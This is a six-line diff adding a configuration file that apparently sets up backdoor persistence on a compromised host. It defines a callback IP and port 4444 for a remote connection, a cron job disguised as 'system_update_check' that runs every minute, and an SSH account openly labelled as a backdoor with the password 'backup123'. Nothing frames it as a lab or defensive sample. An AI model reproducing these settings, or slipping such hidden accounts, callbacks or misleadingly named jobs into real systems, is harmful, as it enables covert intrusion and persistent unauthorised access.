@@ -1,0 +1,6 @@
+callback_ip: "10.0.0.98"
+callback_port: "4444"
+cron_job_name: "system_update_check"
+cron_interval: "*/1"
+ssh_backdoor_user: "backup"
+ssh_backdoor_pass: "backup123"
